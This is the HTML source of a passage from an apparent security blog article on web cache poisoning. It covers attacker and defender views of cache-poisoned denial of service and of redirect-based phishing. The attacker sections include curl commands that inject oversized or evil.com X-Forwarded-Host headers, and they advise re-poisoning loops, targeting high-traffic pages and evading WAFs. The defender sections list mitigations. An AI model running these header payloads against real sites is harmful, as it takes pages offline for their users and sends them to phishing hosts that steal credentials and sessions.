                    </ol>

                    <p>However, the chance of failure here is high since most setups DON'T cache non-200 responses. To work around this, spider the site to find an endpoint that WILL cache the poison.</p>

                    <figure class="article-image">
                        <img src="images/3.png" alt="Diagram showing the flow of a CPDoS attack confirming cached error responses">
                        <figcaption>CPDoS flow: poisoned error response gets cached and served to all subsequent users</figcaption>
                    </figure>
                </li>

                <li>
                    <p><strong>Execute the DoS Poison.</strong></p>
                    <p>After confirming that poisoning is possible, it's time to unleash the attack.</p>
                    <ol>
                        <li>
                            <p>Send the poisoned request to the target endpoint. Example for an oversized host attack:</p>
                            <div class="code-block-wrapper">
                                <div class="code-block-header">
                                    <div class="code-dots"><span></span><span></span><span></span></div>
                                    <span class="code-lang">BASH</span>
                                    <button class="code-copy-btn" data-copy>Copy</button>
                                </div>
                                <pre><code class="language-bash">curl -s -D - -H "X-Forwarded-Host: $(printf 'a%.0s' {1..10000}).evil.com" https://target-site.com/some/cacheable/path > /dev/null</code></pre>
                            </div>
                        </li>
                        <li>Repeat if <code>max-age</code> is short — automate with a loop or script to re-poison every few minutes.</li>
                        <li>For maximum impact, target high-traffic pages.</li>
                    </ol>
                    <p>Legitimate users will receive errors; their browsers will fail to load scripts, CSS, images, or even the full page. This can severely damage the organization under attack.</p>
                </li>

                <li>
                    <p><strong>Edge Cases — Increase Severity.</strong></p>
                    <ol>
                        <li><strong>Vary bypass:</strong> If <code>Vary</code> includes other headers, spoof them to match normal requests.</li>
                        <li><strong>Multi-layer caches:</strong> Poison CDNs first, then origins if possible.</li>
                        <li><strong>Defenses to watch:</strong> WAFs might block weird headers — test stealthily. If hosts are normalized, the poison will be <strong>useless</strong>.</li>
                    </ol>
                </li>
            </ol>

            <h2 id="cpdos-defenders">Cache Poisoned DoS (CPDoS) — Defender's Perspective</h2>

            <ul>
                <li><strong>Do not trust client-controlled headers.</strong> Ignore or strictly validate <code>X-Forwarded-Host</code>, <code>X-Forwarded-Proto</code>, <code>Host</code>, etc. Only accept values from trusted reverse proxies.</li>
                <li><strong>Normalize cache keys.</strong> Ensure caches vary only on intended headers. Do <strong>not</strong> let arbitrary headers influence cache keys unless absolutely required.</li>
                <li><strong>Set proper <code>Vary</code> headers.</strong> Explicitly define which headers affect responses. Missing or overly broad <code>Vary</code> headers are cache poisoning bait.</li>
                <li><strong>Separate dynamic and static content.</strong> Do not cache responses that include redirects, user input, or dynamically generated URLs.</li>
                <li><strong>Harden redirect logic.</strong> Never build redirect targets directly from headers or user input. Use allowlists for domains and schemes.</li>
                <li><strong>Use strict proxy configuration.</strong> Reverse proxies should overwrite forwarding headers instead of passing client-supplied ones upstream.</li>
                <li><strong>Disable caching on sensitive responses.</strong> Apply <code>Cache-Control: no-store</code> or <code>private</code> for redirects, auth flows, and error pages.</li>
                <li><strong>Monitor cache behavior.</strong> Log cache hits involving redirects or unusual headers. Poisoning often leaves fingerprints before damage occurs.</li>
            </ul>

            <h2 id="option-3-redirect-attackers">Option 3: Open Redirect / Phishing Boost by Cache Poisoning — Attacker's Perspective</h2>

            <p>
                If you're familiar with phishing, understanding this attack is not difficult. In this case, a poisoned cache causes the victim's browser to redirect to a resource controlled by the attacker. This can result in users willingly submitting credentials through social engineering, or unintentionally leaking session tokens or cookies.
            </p>

            <p>For example:</p>

            <ol>
                <li>A user clicks an image on <code>instagram.com</code>.</li>
                <li>Instead of being redirected to a legitimate resource owned by Instagram, the user is redirected via a previously poisoned cache to <code>instagrarn.com</code> (intentional typosquatting).</li>
                <li>Because the redirect originates from a trusted domain, the user believes the flow is legitimate and enters login credentials, which are sent directly to the attacker.</li>
                <li>Alternatively, sensitive data can be leaked through the <code>Referer</code> header — for example, the attacker may observe <code>Referer: https://instagram.com/account?session=ABC123</code>, allowing them to hijack the user's session while it remains valid.</li>
            </ol>

            <p>To perform this kind of attack, the following steps must be satisfied.</p>

            <ol>
                <li>
                    <p><strong>Prepare your Endpoint.</strong></p>
                    <p>This step is practically the same as in the XSS cache poisoning section. In order to succeed you need to understand your position:</p>
                    <ol>
                        <li><strong>What do you have in hand:</strong> How good are your skills and are they enough for your plans? Do you own or rent proper infrastructure (domain/subdomain, VPS, etc.)?</li>
                        <li><strong>What will bypass the target's security:</strong> What is theoretically possible given the layers of security the target has?</li>
                        <li><strong>What is your end-goal:</strong> Depending on your goal, your actions to achieve it will be different.</li>
                    </ol>
                </li>

                <li>
                    <p><strong>Identify a vulnerable open redirect endpoint.</strong></p>
                    <p>Spider the site to find URLs that perform redirects based on parameters (e.g., <code>/redirect?url=...</code>, <code>/go?to=...</code>, <code>/link?dest=...</code>) or reflect unkeyed headers like <code>X-Forwarded-Host</code> in <code>Location</code> headers or meta refreshes. Prioritize static-like assets (images, trackers, ad links) as they're often publicly cached.</p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">BASH</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-bash">curl -I -H "X-Forwarded-Host: evil.com" "https://target.com/redirect?cb=test"</code></pre>
                    </div>
                </li>

                <li>
                    <p>After verifying that the cache poison is successful (subsequent clean requests receive a cache HIT and are redirected to your controlled test domain), ensure persistence by automating re-poisoning requests if the <code>max-age</code> is limited — for example, via a scheduled script:</p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">BASH</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-bash">curl -s -H "X-Forwarded-Host: evil.com" "https://target.com/redirect?url=/demo&amp;cb=poison123" > /dev/null</code></pre>
                    </div>
                </li>
            </ol>

            <div class="callout important">
                <span class="callout-icon">❗</span>
                <div class="callout-body">
                    <strong>Important</strong>
                    <strong>Cache buster handling:</strong> If the endpoint ignores cache-buster params (<code>?cb=xyz</code>) in the key, your poison spreads to all variations of that path — massive amplification.
                    <br><br>
                    <strong>Browser caching bonus:</strong> If the response lacks <code>no-cache</code> headers, victims' local browsers also cache the poison — it persists even after the CDN evicts it.
                </div>
            </div>

            <h2 id="option-3-redirect-defenders">Open Redirect / Phishing Boost by Cache Poisoning — Defender's Perspective</h2>

            <ul>
                <li><strong>Threat model.</strong> Treat all client-supplied headers as untrusted by default.</li>
                <li><strong>Trust boundaries.</strong> <code>X-Forwarded-*</code> headers must only be set and overwritten by trusted proxies — never accepted from users.</li>
                <li><strong>Cache abuse awareness.</strong> Attacks target shared caches, turning your own infrastructure into the delivery mechanism.</li>
                <li><strong>Cache key control.</strong> Any header that affects the response must be part of the cache key or ignored completely.</li>
                <li><strong>Redirect hardening.</strong> Avoid caching redirects or strictly validate destination hosts.</li>
                <li><strong>Cache control.</strong> Use <code>Cache-Control: no-store</code> for authentication flows, redirects, and user-specific content.</li>
                <li><strong>Proxy configuration.</strong> Proxies should sanitize, not forward, client-controlled headers.</li>
                <li><strong>Monitoring.</strong> Alert on cached responses pointing to unexpected or external domains.</li>
                <li><strong>Defensive mindset.</strong> Cache poisoning is silent and scalable. Assume it will be attempted, not avoided.</li>
            </ul>

            <div class="callout tip">
                <span class="callout-icon">💡</span>
                <div class="callout-body">
                    <strong>Tip — Chain with other vulnerabilities</strong>
                    <ol>
                        <li>If there's also param reflection (like <code>?next=</code>), combine it for an open redirect + cache poison chain.</li>
                        <li>Or poison error pages by forcing a 404 with a bad path and reflecting the host there.</li>
                    </ol>
                </div>
            </div>

            <hr>

            <div class="callout warning">
                <span class="callout-icon">⚠</span>
                <div class="callout-body">
                    <strong>Warning</strong>
                    Only test against systems you own or have explicit written permission to test.
                </div>
            </div>

        </article>
    </div>

    <!-- ════════════════════════════════════════════════════════
         ARTICLE FOOTER — back link + share buttons
    ════════════════════════════════════════════════════════════ -->
    <section class="article-footer-section">
        <div class="article-footer-divider"></div>
        <div class="article-footer-meta">

            <a href="../../articles.html" class="back-link">
                <svg viewBox="0 0 24 24" fill="none"><path d="M19 12H5M5 12l7 7M5 12l7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                Back to Articles
            </a>

            <div class="article-share">
                <span class="share-label">Share</span>
                <a href="https://twitter.com/intent/tweet?text=Cache Poisoning: The Silent Web Attack You Need to Know About&url=https://aegismartin.com/articles/cache-poisoning-via-http-headers/article.html" target="_blank" rel="noopener" class="share-btn" title="Share on X">
                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
                </a>
                <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://aegismartin.com/articles/cache-poisoning-via-http-headers/article.html" target="_blank" rel="noopener" class="share-btn" title="Share on LinkedIn">
                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6zM2 9h4v12H2z"/><circle cx="4" cy="4" r="2"/></svg>
                </a>
            </div>

        </div>
    </section>

    <!-- ════════════════════════════════════════════════════════
         FOOTER — do NOT modify
    ════════════════════════════════════════════════════════════ -->
    <footer class="footer">
        <div class="footer-content">
            <p>&copy; 2025 Aegis Martin. All rights reserved.</p>
            <div class="footer-links">
                <a href="https://medium.com/@aegis-martin" target="_blank">Medium</a>
                <a href="https://github.com/aegismartin" target="_blank">GitHub</a>
                <a href="https://www.instagram.com/bmp_43/" target="_blank">Instagram</a>
            </div>
        </div>
    </footer>

    <!-- Prism.js — do NOT remove -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>

    <script data-cfasync="false" src="../../assets/js/particles.js"></script>
    <script data-cfasync="false" src="../../assets/js/article-page.js"></script>
    <script data-cfasync="false" src="../../assets/js/nav.js"></script>   

</body>
</html>
